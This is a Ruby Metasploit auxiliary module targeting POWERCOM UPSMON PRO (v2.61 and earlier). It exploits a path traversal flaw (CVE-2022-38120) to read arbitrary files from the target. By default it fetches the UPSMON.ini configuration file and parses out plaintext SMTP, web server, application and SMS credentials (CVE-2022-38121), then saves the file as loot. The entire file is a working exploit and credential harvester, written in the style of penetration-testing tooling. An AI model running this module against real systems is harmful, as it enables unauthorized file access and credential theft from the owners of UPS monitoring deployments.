class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'POWERCOM UPSMON PRO Path Traversal (CVE-2022-38120) and Credential Harvester (CVE-2022-38121)',
        'Description' => %q{
          This module exploits a path traversal vulnerability in UPSMON PRO <= v2.61 to retrieve arbitrary files from the system.
          By default, the configuration file will be retrieved, which contains the credentials (CVE-2022-38121) for the web service, mail server, application, and SMS service.
          However, any arbitrary file can be specified.
        },
        'Author' => [
          'Michael Heinzl'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2022-38120'],
          ['CVE', '2022-38121'],
          ['URL', 'https://www.twcert.org.tw/en/cp-139-6686-4041f-2.html'],
          ['URL', 'https://www.twcert.org.tw/en/cp-139-6687-cbce6-2.html']
        ],
        'DisclosureDate' => '2024-08-22',
        'DefaultOptions' => {
          'RPORT' => 8000,
          'SSL' => 'False'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for UPSMON PRO', '/']),
        OptString.new('FILE', [false, 'The file path to read from the target system, e.g., /Users/Public/UPSMON-Pro/UPSMON.ini', '/Users/Public/UPSMON-Pro/UPSMON.ini']),
        OptInt.new('DEPTH', [ true, 'The traversal depth. The FILE path will be prepended with ../ * DEPTH', 4 ])

      ]
    )
  end

  def check
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'index.html ')
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      return CheckCode::Unknown
    end

    if res && res.code == 200
      data = res.to_s
      if data.include?('My Web Server 1') && data.include?('UPSMON PRO WEB')
        vprint_status('UPSMON PRO Web seems to be running on target system.')
        return CheckCode::Detected
      end
      return CheckCode::Safe
    end
    return CheckCode::Unknown
  end

  def extract_section_fields(section, keys, data)
    # Extract section content between [SectionName] and next section or end of data
    section_regex = /^\[#{Regexp.escape(section)}\](.*?)(?=^\[|\z)/m
    match = data.match(section_regex)
    return {} unless match

    content = match[1]
    result = {}
    expected_keys = keys.map { |k| k.strip.downcase }

    content.each_line do |line|
      line = line.strip
      next if line.empty? || !line.include?('=')

      key, value = line.split('=', 2).map(&:strip)
      key_down = key.downcase

      if expected_keys.include?(key_down)
        result[key_down.to_sym] = value
      end
    end

    result
  end

  def run
    traversal = '../' * datastore['DEPTH'] + datastore['FILE']
    traversal = traversal.gsub(%r{/+}, '/')

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, traversal)
    })

    fail_with(Failure::Unknown, 'No response from server.') if res.nil?
    fail_with(Failure::UnexpectedReply, 'Non-200 returned from server. If you believe the path is correct, try increasing the path traversal depth.') if res.code != 200
    print_good("File retrieved: #{traversal}")

    data = res.body
    if traversal.downcase.end_with?('upsmon.ini')
      print_status('UPSMON.ini specified, parsing credentials:')
      email_creds = extract_section_fields('Email', ['UserName', 'Password', 'SMTP', 'Port'], data)
      webserver_creds = extract_section_fields('WebServer', ['UserName', 'Password'], data)
      main_creds = extract_section_fields('Main', ['AppPassword'], data)
      sms_creds = extract_section_fields('SMS', ['UserName', 'Password', 'UPSName', 'PhoneNum'], data)

      print_status("SMTP: #{email_creds[:smtp].nil? || email_creds[:smtp].empty? ? '(not configured)' : email_creds[:smtp]}")
      print_status("Port: #{email_creds[:port].nil? || email_creds[:port].empty? ? '(not configured)' : email_creds[:port]}")
      print_status("Email UserName: #{email_creds[:username].nil? || email_creds[:username].empty? ? '(not configured)' : email_creds[:username]}")
      print_status("Email Password: #{email_creds[:password].nil? || email_creds[:password].empty? ? '(not configured)' : email_creds[:password]}")

      print_status("WebServer UserName: #{webserver_creds[:username].nil? || webserver_creds[:username].empty? ? '(not configured)' : webserver_creds[:username]}")
      print_status("WebServer Password: #{webserver_creds[:password].nil? || webserver_creds[:password].empty? ? '(not configured)' : webserver_creds[:password]}")

      print_status("Main AppPassword: #{main_creds[:apppassword].nil? || main_creds[:apppassword].empty? ? '(not configured)' : main_creds[:apppassword]}")

      print_status("SMS UserName: #{sms_creds[:username].nil? || sms_creds[:username].empty? ? '(not configured)' : sms_creds[:username]}")
      print_status("SMS Password: #{sms_creds[:password].nil? || sms_creds[:password].empty? ? '(not configured)' : sms_creds[:password]}")
      print_status("UPS Name: #{sms_creds[:upsname].nil? || sms_creds[:upsname].empty? ? '(not configured)' : sms_creds[:upsname]}")
      print_status("Phone Number: #{sms_creds[:phonenum].nil? || sms_creds[:phonenum].empty? ? '(not configured)' : sms_creds[:phonenum]}")
    end

    store_loot('upsmonpro.file', 'text/plain', datastore['RHOSTS'], data, datastore['FILE'], 'File retrieved through UPSMON PRO path traversal.')
    print_status('File saved as loot.')
  end
end
